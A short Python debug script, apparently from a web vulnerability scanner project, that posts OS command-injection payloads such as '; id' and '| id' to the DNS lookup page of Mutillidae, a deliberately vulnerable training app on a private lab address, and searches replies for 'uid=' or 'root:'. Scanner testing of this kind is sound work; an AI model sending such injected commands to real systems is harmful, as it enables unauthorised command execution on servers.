"""Debug Mutillidae response"""
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.path.insert(0, "C:/Users/HZR/.qclaw/workspace-agent-b7ed571b/wvs-v18")

import asyncio
import aiohttp

async def debug_mutillidae():
    url = "http://192.168.18.131/mutillidae/index.php"
    
    # Try different payloads
    payloads = [
        {"page": "dns-lookup.php", "title": "DNS Lookup", "target_host": "; id"},
        {"page": "dns-lookup.php", "title": "DNS Lookup", "target_host": "| id"},
        {"page": "dns-lookup.php", "title": "DNS Lookup", "target_host": "127.0.0.1; id"},
        {"page": "dns-lookup.php", "title": "DNS Lookup", "target_host": "127.0.0.1| id"},
    ]
    
    async with aiohttp.ClientSession() as session:
        for i, data in enumerate(payloads):
            print(f"\n--- Test {i+1}: target_host={data['target_host']!r} ---")
            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                
                # Search for command output patterns
                import re
                for pattern in [r"uid=\d+", r"www-data", r"root:", r"gid=\d+"]:
                    if re.search(pattern, content):
                        m = re.search(pattern, content)
                        print(f"Found: {m.group(0)}")
                
                # Check if DNS lookup output appears
                if "PING" in content or "packets" in content.lower():
                    print("DNS lookup executed (PING output found)")
                
                # Print a snippet around any "id" occurrence
                if " id " in content or ";id" in content or "|id" in content:
                    idx = content.find("id")
                    print(f"Context: ...{content[max(0,idx-50):idx+50]}...")

if __name__ == "__main__":
    asyncio.run(debug_mutillidae())
